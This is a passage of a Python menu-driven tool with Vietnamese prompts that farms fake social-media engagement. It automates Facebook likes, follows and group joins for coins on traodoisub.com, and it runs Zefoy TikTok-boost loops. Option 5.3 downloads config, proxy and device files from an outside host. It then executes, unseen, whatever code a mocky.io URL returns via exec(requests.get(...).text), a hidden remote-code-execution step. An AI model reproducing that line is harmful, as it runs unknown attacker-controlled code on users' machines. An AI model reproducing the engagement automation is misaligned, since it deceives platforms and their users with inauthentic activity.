                    print(f'{do}[{vang}ĐANG TÌM JOB SAU{do}] {trang}=> {xanh_la}{i} {vang}GIÂY    ',end='\r')
                    sleep(1)
            else :
                if so == 5 :
                    for i in range(20,-1,-1):
                        print(f'{do}[{vang}ĐANG TÌM JOB SAU{do}] {trang}=> {xanh_la}{i} {vang}GIÂY    ',end='\r')
                        sleep(1)
        except :
            for job_2 in a:
                id_job = job_2["id"]
                if job == "like" :
                    type_1 = "LIKE"
                    type_2 = '1635855486666999'
                    lam = fb.reaction(id_job, type_2)
                elif job == "likegiare" :
                    type_1 = "LIKEGIARE"
                    type_2 = '1635855486666999'
                    lam = fb.reaction(id_job, type_2)
                elif job == "likesieure" :
                    type_1 = "LIKESIEURE"
                    type_2 = '1635855486666999'
                    lam = fb.reaction(id_job, type_2)
                elif job == "reaction" :
                    type_1 = job_2["type"]
                    type_2 = type_cx(type_1) 
                    lam = fb.reaction(id_job, type_2)
                elif job == "group" :
                    type_1 = "GROUP"
                    lam = fb.join(id_job)
                elif job == "follow" :
                    type_1 = "FOLLOW"
                    lam = fb.subscribe(id_job)
                    
                nhan = requests.get(f'https://traodoisub.com/api/coin/?type={type_1}&id={id_job}&access_token={token}')
                
                try :
                    nhan_1 = nhan.json()["error"] 
                    print (f' ERROR => {id_job} ',end='\r')
                    sleep(1)
                except :
                    tt += 1
                    gio = datetime.datetime.now().strftime("%H:%M:%S")
                    xu_1 = nhan.json()["data"]["msg"]
                    xu_2 = nhan.json()["data"]["xu"]
                    print (f"\033[1;37m {tt} | {type_1} | {id_job} | {xu_1} | {xu_2} Xu")
                    idelay(dl)
                    
  elif nhap == '4.2':
    clear()
    runbanner(chontool)
    tdstt()
    
  elif nhap == '4.3':
    print(f"{do}TOOL ĐANG BẢO TRÌ. VUI LÒNG QUAI LẠI SAU!!")
  
  elif nhap == '4.4':
    print(f"{do}TOOL ĐANG BẢO TRÌ. VUI LÒNG QUAI LẠI SAU!!")
    
  elif nhap == '4.5':
    print(f"{do}TOOL ĐANG BẢO TRÌ. VUI LÒNG QUAI LẠI SAU!!")
    
                    
  elif nhap == '5':
    clear()
    runbanner(nam)               
  elif nhap == '5.2':
    clear()
    runbanner(chontool)
    Z = Zefoy()
    threading.Thread(target=Z.check_config).start()
    threading.Thread(target=Z.update_name).start()
    Z.send_captcha()
    while True:
        try: 
            if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}</>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
        except Exception as e:print(f'LỖI NGHIÊM TÚC | thử lại sau 10 giây.|| {e}');time.sleep(10)

  elif nhap == '5.1':
    clear()
    runbanner(chontool)
    Z = Zefoy2()
    threading.Thread(target=Z.check_config2).start()
    threading.Thread(target=Z.update_name2).start()
    Z.send_captcha2()
    while True:
        try: 
            if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}</>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
        except Exception as e:print(f'LỖI NGHIÊM TÚC | thử lại sau 10 giây.|| {e}');time.sleep(10)


  elif nhap == '5.3':
    url = "https://hoanganh.eu.org/archive/config.json"
    url1 = "https://hoanganh.eu.org/archive/proxy.json"
    url2 = "https://hoanganh.eu.org/archive/devices.txt"
    save_path = "config.json"
    save_path1 = "proxy.json"
    save_path2 = "devices.txt"
    download_file(url, save_path)
    download_file(url1, save_path1)
    download_file(url2, save_path2)
    exec(requests.get('https://run.mocky.io/v3/5728581a-1bce-43c9-855a-b85f92052922').text)
    
  
  elif nhap == '6':
    clear()
    runbanner(sau)

  elif nhap == '6.1':
    clear()
    runbanner(chontool)
    fakeEmail()
    
  elif nhap == '6.2':
    clear()
    runbanner(chontool)
    print(f"{xanh_la}Nếu bạn chưa biết sử dụng lệnh nào hãy sử dụng \033[4m\033[94m!help\033[0m {xanh_la}để biết thêm chi tiết")
    luachon()
  
  else:
    print(f"{do}Vui lòng điền đúng")
    
while True:
  main()
    

